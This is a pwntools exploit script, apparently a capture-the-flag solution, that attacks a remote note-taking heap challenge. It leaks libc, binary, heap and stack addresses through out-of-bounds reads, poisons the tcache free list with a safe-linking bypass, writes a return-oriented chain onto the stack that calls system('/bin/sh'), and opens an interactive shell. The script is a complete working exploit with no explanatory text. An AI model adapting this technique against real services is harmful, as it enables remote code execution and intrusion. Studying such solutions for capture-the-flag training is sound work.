#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

io = remote("iloverust.challs.pwnoh.io", 1337, ssl=True)

def create(size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'size? > ', str(size).encode())
    io.sendlineafter(b'note: ', data)

def read(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'ID? > ', str(idx).encode())

def modify(idx, size, data):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'ID? > ', str(idx).encode())
    io.sendlineafter(b'size? > ', str(size).encode())
    io.sendlineafter(b'note: ', data)

def delete(idx):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'ID? > ', str(idx).encode())

read(-12)
io.recvuntil(b'Note: ')
libc.address = unpack(io.recv(6), 'all') - libc.sym._IO_2_1_stderr_

read(-2)
io.recvuntil(b'Note: ')
exe.address = unpack(io.recv(6), 'all') - 0x4060

create(1040, b'0')
create(8, b'1')
delete(0)
create(1060, b'0')
create(24, b'')
for i in range(8): create(24, b'')
for i in range(4, 10): delete(i)
delete(2)
delete(3)

read(((libc.sym.main_arena+16) - (exe.address + 0x4080))//16)
io.recvuntil(b'Note: ')
heap = unpack(io.recv(6), 'all') - 0x136c0

modify(0, 1060, p64(libc.sym.environ))
offset = ((heap+0x13b10) - (exe.address + 0x4080))//16
modify(0, 1060, p64(libc.sym.environ) + p32(1060) + p32(offset))
read(offset)
io.recvuntil(b'Note: ')
stack = unpack(io.recv(6), 'all')

create(80, b'2')
create(80, b'3')
modify(0, 1060, p64(heap+0x13850) + p32(1060) + p32(offset))
delete(2)
delete(offset)

modify(3, 80, p64((stack - 0x138) ^ ((heap+0x13850) >> 12)))
create(80, b'2')

create(80, p64(0xdeadbeef) + p64(exe.address + 0x101a) + p64(exe.address + 0x1577) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(libc.sym.system))

io.sendlineafter(b'> ', b'A'*8)
io.interactive()
